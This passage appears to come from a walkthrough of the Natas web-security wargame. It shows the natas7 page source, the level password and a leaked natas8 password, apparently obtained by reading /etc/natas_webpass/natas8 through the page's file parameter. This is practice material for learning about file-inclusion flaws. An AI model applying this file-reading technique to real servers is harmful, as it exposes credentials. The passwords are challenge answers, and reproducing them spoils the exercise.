<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

---

# Level 8 - START HERE;






